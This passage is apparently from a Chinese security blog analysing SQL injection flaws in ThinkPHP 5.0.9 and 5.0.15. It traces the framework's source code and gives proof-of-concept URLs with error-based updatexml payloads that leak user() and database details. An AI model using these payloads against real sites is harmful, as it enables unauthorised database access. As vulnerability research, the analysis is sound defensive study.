# 前言
说好的和组内大佬一起审cms，搞着搞着就走上了分析ThinkPHP的道路。
分析了这两年的一些ThinkPHP注入漏洞，希望找到一些共性。有tp5的也有tp3的。
至于最终的总结，由于能力问题也就不在这献丑了，大师傅们肯定有自己更好的见解。
比如phpoop师傅的 [ThinkPHP3.2.3框架实现安全数据库操作分析](https://xz.aliyun.com/t/79)
# ThinkPHP 5.0.9 鸡肋SQL注入
虽说鸡肋，但是原理还是很值得深思的，而且也能靠报错获取一手数据库信息。
## 漏洞利用
先从官网下载版本为`5.0.9`的thinkphp，然后创建一个demo应用，这里直接借鉴的p神vulhub中的代码和数据
 （
不直接用docker环境是为了方便后期调试溯源
还有一个点就是thinkphp默认是开启debug模式的，就会显示尽可能多的报错信息，也是利用这个才能获取到数据库信息。这个感觉其实也怪不了官网，毕竟本身就是个框架，开发过程中debug是刚需，而且官方手册也一再强调过要在生产环境要关闭debug，即使默认关闭觉得也不缺乏直接debug环境上线的程序员
:dizzy_face:
再有就是说明一下index.php中的代码
    public function index()
    {
        $ids = input('ids/a');
        $t = new User();
        $result = $t->where('id', 'in', $ids)->select();
        foreach($result as $row) {
            echo "Hello, {$row['username']}";
        }
    }
重点在于`$ids = input('ids/a');`，这也是触发漏洞一个关键，至于是什么意思呢可以查看官方手册得到答案
就是以数组的形式接受参数。
最后，可以开始真正的攻击了，访问如下url
    http://localhost/tp5.0.9/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
即可得到sql语句的报错
在下面还能报错出数据库的配置信息
那为什么说鸡肋呢，因为之只能通过报错获取类似于`database()`、`user()`这类信息，而不支持子查询
## 漏洞分析
在一开始下好断点，跟进`$t->where('id', 'in', $ids)->select()`语句
一开始先调用了`thinkphp\library\think\db\Query.php:2277`的`select`方法
然后跟进2306行处的`$sql = $this->builder->select($options);`
然后来到664行
    public function select($options = [])
    {
        $sql = str_replace(
            ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'],
            [
                $this->parseTable($options['table'], $options),
                $this->parseDistinct($options['distinct']),
                $this->parseField($options['field'], $options),
                $this->parseJoin($options['join'], $options),
                $this->parseWhere($options['where'], $options),
                $this->parseGroup($options['group']),
                $this->parseHaving($options['having']),
                $this->parseOrder($options['order'], $options),
                $this->parseLimit($options['limit']),
                $this->parseUnion($options['union']),
                $this->parseLock($options['lock']),
                $this->parseComment($options['comment']),
                $this->parseForce($options['force']),
            ], $this->selectSql);
        return $sql;
    }
在这里调用了一次`$this->parseWhere($options['where'], $options)`解析
    protected function parseWhere($where, $options)
    {
        $whereStr = $this->buildWhere($where, $options);
        ....
    }
跟进第一行的`$whereStr = $this->buildWhere($where, $options);`
然后来到下面的`buildWhere`函数中，最后进入到282行附近的如下语句
    } else {
        // 对字段使用表达式查询
        $field = is_string($field) ? $field : '';
        $str[] = ' ' . $key . ' ' . $this->parseWhereItem($field, $value, $key, $options, $binds);
    }
重点就在`$this->parseWhereItem`中，也就是在这里进行了对`in`的处理，来看下这个函数
由于代码太多，只贴一部分重要的相关处理逻辑
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        ....
        $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
        if (preg_match('/\W/', $bindName)) {
            // 处理带非单词字符的字段名
            $bindName = md5($bindName);
        }
        ....
        } elseif (in_array($exp, ['NOT IN', 'IN'])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
            } else {
                $value = is_array($value) ? $value : explode(',', $value);
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    foreach ($value as $k => $v) {
                        if ($this->query->isBind($bindName . '_in_' . $k)) {
                            $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                        } else {
                            $bindKey = $bindName . '_in_' . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = ':' . $bindKey;
                    }
                    $this->query->bind($bind);
                    $zone = implode(',', $array);
                } else {
                    $zone = implode(',', $this->parseValue($value, $field));
                }
                $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
            }
        } 
        ....
        return $whereStr;
    }
可以看到一开始其实是对传入的参数进行了正则匹配处理的，但是由于传入的是一个数组，也就绕过了这个匹配
可以看到之后就将数组中的值遍历出来，然后将key值拼接到SQL语句中
最终的`$whereStr`值为
    `id` IN (:where_id_in_0,updatexml(0,concat(0xa,user()),0))
从而导致在编译SQL语句的时候发生错误，从而产生报错。
这也就意味着我们控制了PDO预编译过程中的键名，这里有个疑问就是为什么不能用子查询呢？
引用下p神的文章 
> 通常，PDO预编译执行过程分三步：
>
>   1. `prepare($SQL)` 编译SQL语句
>   2. `bindValue($param, $value)` 将value绑定到param的位置上
>   3. `execute()` 执行
>
>
> 这个漏洞实际上就是控制了第二步的`$param`变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的。
>
> 但实际上，在预编译的时候，也就是第一步即可利用。
>
> 究其原因，是因为我这里设置了`PDO::ATTR_EMULATE_PREPARES => false`。
>
>
> 这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后`execute()`的时候才发送给数据库执行；如果我这里设置了`PDO::ATTR_EMULATE_PREPARES
> => false`，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。
>
>
> 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing->resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization->execution）。
>
> 这时，假设在第一步执行`prepare($SQL)`的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。
在ThinkPHP中也能明显看到`PDO::ATTR_EMULATE_PREPARES`这个选项是默认关闭的
    // PDO连接参数
    protected $params = [
        PDO::ATTR_CASE              => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
这样，在执行预编译的编译SQL语句阶段mysql就会报错，但并没有与数据交互，所以只能爆出类似于`user()`、`database()`这类最基础的信息，而不能进行子查询。
最后，膜一下p神对于这种底层机制的深入研究，从最根本的原理层面去剖析这种问题。
关于这个漏洞可以触发的点除了`in`还有一些例如`like`、`not like`、`not in`
框架采用的PDO机制可以说从根本上已经解决了一大堆SQL方面的安全问题，但往往有时就是对安全的过于信任，导致这里是在参数绑定的过程中产生了注入，不过PDO也可以说是将危害降到了最小。
# ThinkPHP 5.0.15 update/insert 注入
## 漏洞利用
从官网下载`ThinkPHP5.0.15`，在`application/index/controller/Index.php`中插入
    public function index()
    {
        $username = input('get.username/a');
        $res = db('user')->where(['id'=> 1])->insert(['username'=>$username]);
        var_dump($res);
    }
依旧是以数组的形式接受参数
然后创建一个简单的`user`表
然后在`database.php`配置好数据库信息，最后打在`congfig.php`中将`app_debug`开为`true`。（应该是前一个5.0.9的漏洞原因修改了默认设置吧
最后访问如下url，即可产生sql注入（虽然还是鸡肋型的
    http://localhost/tp5.0.15/public/index.php
    ?username[0]=inc
    &username[1]=updatexml(1,concat(0x7,user(),0x7e),1)
    &username[2]=1
## 漏洞分析
在`$res = db('user')->where(['id'=>
1])->insert(['username'=>$username]);`下好断点后进入
跟随到`insert`函数中`thinkphp/library/think/db/Query.php:2079`
    public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this->parseExpress();
        $data    = array_merge($options['data'], $data);
        // 生成SQL语句
        $sql = $this->builder->insert($data, $options, $replace);
        ....
跟进`$sql = $this->builder->insert($data, $options, $replace);`
然后跟进到第一行的`$data = $this->parseData($data, $options);`中看看是如何解析数据的
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }
        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }
        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);
            if (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
            ....
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            } elseif (is_scalar($val)) {